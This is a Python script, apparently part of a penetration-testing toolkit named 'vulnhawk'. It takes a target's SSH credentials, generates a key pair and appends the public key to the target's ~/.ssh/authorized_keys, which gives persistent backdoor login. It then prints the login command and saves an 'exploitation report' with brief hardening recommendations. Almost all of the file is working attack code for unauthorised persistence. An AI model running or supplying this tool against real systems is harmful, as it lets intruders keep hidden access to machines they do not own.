import paramiko
import os
import sys  # Import sys to handle exit
import time  # Import time for adding delays
import datetime

# Report class to gather and save the results
class Report:
    def __init__(self, target_ip, attack_type):
        self.target_ip = target_ip
        self.attack_type = attack_type
        self.date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.details = []
        self.success = False

    def add_detail(self, description):
        self.details.append(description)

    def set_success(self, success):
        self.success = success

    def generate_report(self):
        report_content = f"""
        SSH Exploitation Report
        =======================
        
        Target IP: {self.target_ip}
        Attack Type: {self.attack_type}
        Date: {self.date}
        
        Summary:
        --------
        Attack Success: {"Yes" if self.success else "No"}
        
        Details:
        --------
        """
        for idx, detail in enumerate(self.details, 1):
            report_content += f"{idx}. {detail}\n"

        report_content += "\nRecommendations:\n-----------------\n"
        report_content += "1. Ensure SSH keys are securely managed and access is restricted.\n"
        report_content += "2. Regularly audit the ~/.ssh/authorized_keys file for unauthorized keys.\n"
        report_content += "3. Implement two-factor authentication for SSH access.\n"

        report_content += "\nConclusion:\n-----------\n"
        report_content += "Review the details above and take necessary actions to secure the SSH configuration and prevent unauthorized access.\n"

        return report_content

    def save_report(self):
        # Generate a unique filename with attack type and timestamp
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"vulnhawk_{self.attack_type}_report_{timestamp}.txt"
        report_content = self.generate_report()
        with open(filename, "w") as report_file:
            report_file.write(report_content)
        print(f"[+] Report saved as '{filename}'")

# Function to generate an SSH key pair if it doesn't already exist
def generate_ssh_key_pair(key_name="id_rsa"):
    if not os.path.exists(key_name) or not os.path.exists(f"{key_name}.pub"):
        print("[+] Generating SSH key pair...")
        os.system(f'ssh-keygen -t rsa -b 2048 -f {key_name} -q -N ""')
        print(f"[+] SSH key pair generated: {key_name} and {key_name}.pub")
    else:
        print(f"[+] SSH key pair already exists: {key_name} and {key_name}.pub")

# Function to inject the public SSH key into the target's authorized_keys file
def inject_ssh_key(client, public_key_path, report):
    try:
        # Read the public key
        with open(public_key_path, 'r') as pubkey_file:
            public_key = pubkey_file.read().strip()

        # Ensure the .ssh directory exists and has the correct permissions
        stdin, stdout, stderr = client.exec_command('mkdir -p ~/.ssh && chmod 700 ~/.ssh')
        stdout.channel.recv_exit_status()

        # Inject the public key into the authorized_keys file
        inject_command = f'echo "{public_key}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
        stdin, stdout, stderr = client.exec_command(inject_command)
        stdout.channel.recv_exit_status()

        print("[+] Public key injected into ~/.ssh/authorized_keys")
        report.add_detail("Public key injected into ~/.ssh/authorized_keys")
        report.set_success(True)
    except Exception as e:
        print(f"[!] Error during key injection: {e}")
        report.add_detail(f"Error during key injection: {e}")
        report.set_success(False)

# Main function to handle the SSH key injection process
def main():
    print("Starting SSH Key Injection...")
    
    ssh_host = input("Enter the target host IP: ")
    ssh_user = input("Enter the target username: ")
    ssh_password = input("Enter the target user's password: ")

    # Initialize report with attack type
    report = Report(target_ip=ssh_host, attack_type="ssh_key_injection")

    key_name = "id_rsa"
    generate_ssh_key_pair(key_name)
    report.add_detail(f"SSH key pair checked/generated: {key_name} and {key_name}.pub")

    try:
        # Establish SSH connection to the target
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ssh_host, username=ssh_user, password=ssh_password)
        report.add_detail(f"Connected to {ssh_host} as {ssh_user}")

        # Inject the public key
        public_key_path = f"{key_name}.pub"
        inject_ssh_key(client, public_key_path, report)

        # Close the SSH connection
        client.close()
        
        print("\n[+] SSH Key Injection complete. You can now log in using your private key:")
        print(f"    ssh -i {key_name} {ssh_user}@{ssh_host}")

    except Exception as e:
        print(f"[!] An error occurred: {e}")
        report.add_detail(f"An error occurred: {e}")
        report.set_success(False)
    finally:
        if client:
            client.close()

    # Save the report with a unique filename
    report.save_report()

    time.sleep(2)  # Adding delay to observe the output
    end_or_return()  # Call the function to ask the user what to do next

def end_or_return():
    choice = input("\n[1] Return to Main Menu\n[0] Exit\nSelect an option: ")
    if choice == '1':
        from main import main_menu  # Import the main_menu function from main.py
        main_menu()
    elif choice == '0':
        sys.exit()
    else:
        print("[!] Invalid selection.")
        end_or_return()

if __name__ == "__main__":
    main()
